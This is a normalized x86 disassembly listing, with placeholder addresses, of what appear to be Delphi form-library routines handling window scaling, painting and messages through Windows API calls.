mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
neg edx
mov eax [ edi + 0xc ]
neg eax
call sub_416164
push esi
mov edi esi
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx esi
mov eax ebx
call sub_442504
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_457fd0
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_458031
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_403474
test al al
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_445814
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458038
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x4 ] edx
retn
mov eax [ ebp - 0x8 ]
mov [ eax + 0x4 ] 0x1
sub_458060
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
xor ebx ebx
mov [ ebp - 0x114 ] ebx
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4581c4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_4581a4
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov ecx ebx
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xe0 ]
mov eax [ ebp - 0x4 ]
call sub_403230
cmp eax [ r-xdata ]
je r-xdata
add esp 0xfffffff0
call sub_40360c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4581ab
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x1
xor eax eax
push ebp
push sub_45816c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_417330
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfe
retn
lea edx [ ebp - 0x110 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_403238
lea eax [ ebp - 0x110 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x114 ]
mov eax [ rw-data ]
call sub_405dec
mov ecx [ ebp - 0x114 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b814
call sub_403a74
sub_4581ec
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
test [ ebx + 0x2f4 ] 0x20
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd4 ]
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_4034e4
and [ ebx + 0x2f4 ] 0xdf
sub_458224
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_457830
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
xor edx edx
mov eax ebx
call sub_43f420
xor edx edx
mov eax ebx
call sub_43f444
mov edx 0x140
mov eax ebx
call sub_43f46c
mov edx 0xf0
mov eax ebx
call sub_43f490
mov dl 0x1
mov eax [ r-xdata ]
call sub_427078
mov esi eax
mov [ ebx + 0x240 ] esi
push 0x31
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x32
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax [ ebx + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebx + 0x240 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_458b40
mov dl 0x1
mov eax [ r-xdata ]
call sub_420d88
mov esi eax
mov [ ebx + 0x238 ] esi
mov eax esi
mov edx ebx
call sub_43e88c
mov al [ r-xdata ]
mov [ ebx + 0x228 ] al
mov [ ebx + 0x229 ] 0x2
mov [ ebx + 0x22b ] 0x0
mov [ ebx + 0x231 ] 0x3
mov [ ebx + 0x244 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ ebx + 0x25c ] eax
mov [ ebx + 0x235 ] 0x1
mov eax ebx
call sub_403230
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x2e1 ] 0xff
xor eax eax
mov [ ebx + 0x2ec ] eax
xor edx edx
mov eax ebx
call sub_458ea4
xor edx edx
mov eax ebx
call sub_43fe74
xor edx edx
mov eax ebx
call sub_43fddc
mov dl 0x1
mov eax ebx
call sub_446610
mov edx ebx
mov eax [ rw-data ]
call sub_45d508
mov [ ebx + 0x2e4 ] 0xa
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_45839d
add [ eax ] al
add [ ebx - 0x75 ] dl
fsub [ ecx + rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov eax ebx
call sub_41d338
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
mov edx ebx
call sub_4176b4
xor edx edx
mov eax ebx
call sub_41a2bc
cmp [ ebx + 0x264 ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0xc ]
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
mov eax ebx
call sub_45c3b0
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
sub_458408
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_403674
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
xor eax eax
push ebp
push sub_4584d2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x234 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45ad2c
mov eax [ ebp - 0x4 ]
call sub_4467d4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd8 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_45d540
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_4032e8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
call sub_4032e8
mov eax [ ebp - 0x4 ]
add eax 0x2f0
call sub_40d18c
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_4578a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4584d9
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xac ]
sub_4584ec
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2d2 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
xor eax eax
push ebp
push j_sub_403788#9
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2d4 ]
call [ ebx + 0x2d0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_458ea4
sub_458532
mov eax [ ebp - 0x4 ]
mov si 0xffad
call sub_4034e4
test al al
jne r-xdata
call sub_403af0
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
call sub_403a9c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_458ea4
sub_458568
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2da ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_4585a9
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2dc ]
call [ ebx + 0x2d8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_4585c8
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_441d6c
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi eax
xor eax eax
mov [ ebx + 0x220 ] eax
mov eax edi
mov si 0xffb8
call sub_4034e4
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_45a870
sub_458604
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_43f180
mov eax ebx
sub al 0x1
jb r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
je r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
cmp [ edi + 0x2f0 ] 0x0
jne r-xdata
mov ebp [ edi + 0x2f0 ]
test ebp ebp
je r-xdata
jmp r-xdata
cmp [ edi + 0x250 ] 0x0
je r-xdata
cmp [ edi + 0x248 ] 0x0
jne r-xdata
mov edx esi
mov eax [ edi + 0x2f0 ]
call sub_417414
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ edi + 0x2f0 ] eax
cmp esi [ edi + 0x248 ]
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
mov eax [ edi + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp edi [ esi + 0x4 ]
jne r-xdata
cmp esi [ edi + 0x258 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_459c68
mov edx esi
mov eax ebp
call sub_4176b4
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
cmp esi [ edi + 0x260 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_459c40
mov edx esi
mov eax edi
call sub_459c68
jmp r-xdata
xor edx edx
mov eax edi
call sub_459c1c
sub_458710
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_442d30
xor edx edx
push ebp
push sub_458966
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x268 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x26c ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x270 ] edx
xor ebx ebx
mov al [ rw-data ]
xor al 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x234 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44248c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x25c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x270 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
test eax eax
jle r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_43f6cc
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ r-xdata ]
mov [ eax + 0x98 ] dl
test bl bl
jne r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_43f710
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x25c ] eax
mov eax [ ebp - 0x4 ]
call sub_458a98
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
cmp esi eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
mov edx [ rw-data ]
cmp eax [ edx + 0x40 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_440e64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45896d
mov eax [ ebp - 0x4 ]
call sub_442d38
retn
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_457d70
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_445f5c
mov bl 0x1
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_457d70
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x270 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_445f5c
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x68 ]
mov eax esi
call sub_42064c
push eax
call MulDiv
mov edx eax
mov eax esi
call sub_420654
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x268 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x26c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_458975
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4437d8
push 0x0
push 0x0
push ebx
push sub_458a7c
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_458a48
push ebx
push sub_458a60
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push r-xdata
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
retn
sub_458a27
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_41a9b4
test al al
je r-xdata
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_43fddc
sub_458ab3
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add bl al
lea eax [ eax ]
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_457d70
mov ecx edi
mov edx esi
mov eax ebx
call sub_445f5c
mov eax ebx
call sub_458b9c
test al al
je r-xdata
push edi
push esi
mov ebp [ ebx + 0x68 ]
mov eax ebp
call sub_4206f0
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_42070c
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_43f6f8
mov ebp eax
push edi
push esi
mov eax ebx
call sub_43f6b4
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_458e44
push edi
push esi
push ebp
call MulDiv
mov edx eax
mov eax ebx
call sub_458e74
sub_458b40
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_4464d0
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_4467d4
test al al
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_45aea0
push eax
push 0x1
push 0x80
mov eax ebx
call sub_4464d0
push eax
call SendMessageA
pop ebx
retn
sub_458bd4
push ebx
mov ebx eax
mov eax ebx
call sub_459af0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov al [ ebx + 0x229 ]
sub al 0x2
je r-xdata
mov al 0x1
sub al 0x3
je r-xdata
mov al 0x1
pop ebx
retn
xor eax eax
jmp r-xdata
cmp al [ ebx + 0x210 ]
jne r-xdata
sub_458c68
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4464d0
push eax
call IsIconic
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_446598
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetRect
push 0xffffffec
mov eax ebx
call sub_4464d0
push eax
call GetWindowLongA
push eax
cmp [ ebx + 0x248 ] 0x0
setne al
neg al
sbb eax eax
push eax
push 0xfffffff0
mov eax ebx
call sub_4464d0
push eax
call GetWindowLongA
push eax
push esi
call AdjustWindowRectEx
mov eax [ ebx + 0x4c ]
sub eax [ esi + 0xc ]
add eax [ esi + 0x4 ]
push eax
mov eax [ ebx + 0x48 ]
sub eax [ esi + 0x8 ]
add eax [ esi ]
push eax
push 0x0
push 0x0
push esi
call SetRect
pop esi
pop ebx
retn
sub_458cf0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx esi
mov eax ebx
call sub_446a30
cmp ebx esi
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov eax ebx
call sub_41d6bc
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov edx edi
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_41d690
mov edi eax
mov eax edi
mov si 0xfff1
call sub_4034e4
test al al
jne r-xdata
sub_458d5c
push ebx
push esi
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax ebx
call sub_403230
cmp esi eax
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_458d88
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax [ esp ]
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov eax ebp
call sub_4431c8
sub [ esp + 0x4 ] eax
mov [ esp + 0x8 ] 0xffffffff
mov eax ebp
call sub_41d6bc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebp
call sub_446a78
jmp r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
inc [ esp + 0x8 ]
mov eax [ esp + 0x8 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
mov edx edi
mov eax ebp
call sub_41d690
mov si 0xfff1
call sub_4034e4
test al al
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_41d6cc
jmp r-xdata
sub_458e1c
push ebx
mov ebx eax
cmp dl [ ebx + 0x60 ]
je r-xdata
pop ebx
retn
mov eax ebx
call sub_43fe98
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_440e64
sub_458e44
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_43f6cc
pop ebx
retn
mov [ ebx + 0x268 ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_458e74
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_43f710
pop ebx
retn
mov [ ebx + 0x26c ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_458ea4
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi + 0x2f4 ] 0x1
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx ebx
mov eax esi
call sub_43fbd0
cmp bl [ esi + 0x57 ]
je r-xdata
and [ esi + 0x2f4 ] 0xfd
pop esi
pop ebx
retn
or [ esi + 0x2f4 ] 0x2
jmp r-xdata
mov eax esi
call sub_459fdc
pop esi
pop ebx
retn
sub_458ee8
push ebp
mov ebp esp
push 0x0
xor edx edx
push ebp
push sub_458f41
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458f48
lea eax [ ebp - 0x4 ]
call sub_404038
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405dec
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7d8
call sub_403a74
sub_458f50
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
je r-xdata
test eax eax
jne r-xdata
mov edx esi
mov eax ebx
call sub_43fb84
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax ebx
call sub_4439f0
mov eax ebx
call sub_443b8c
sub_458f88
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_41d508
cmp [ ebx + 0x250 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax [ ebx + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x2c ]
sub_458fc8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov edx eax
cmp edx 0x46
jg r-xdata
sub edx 0xb01a
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
dec edx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
add edx 0xfffffffa
sub edx 0x3
jb r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_443eac
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_4034e4
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub edx 0x22
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffb1
call sub_4034e4
jmp r-xdata
cmp eax [ rw-data ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx ] 0x7
jne r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x1
jne r-xdata
dec edx
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb025
mov eax [ ebp - 0x4 ]
call sub_440e64
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax [ ebp - 0x4 ]
call sub_440e64
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax [ ebp - 0x4 ]
call sub_440e64
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax [ ebp - 0x4 ]
call sub_440e64
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax [ ebp - 0x4 ]
call sub_440e64
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_440e64
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x229 ]
sub al 0x2
je r-xdata
sub al 0x2
jne r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x2
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov esi [ ebx + 0x8 ]
cmp [ esi ] 0x1
jne r-xdata
jmp r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x1
jmp r-xdata
sub al 0x3
jne r-xdata
xor esi esi
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_452ee0
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4598f4
test eax eax
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_420d88
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_459241
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_459224
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0xc ]
call sub_4214ec
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_42138c
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
call sub_4545cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45922b
xor edx edx
mov eax [ ebp - 0xc ]
call sub_4214ec
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
mov edx [ esi + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_452ee0
mov edi eax
test edi edi
je r-xdata
test esi esi
je r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4598f4
call sub_4464d0
mov esi eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4464d0
push eax
call GetWindowDC
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_45936f
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_420d88
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_459348
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_45932b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_4214ec
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
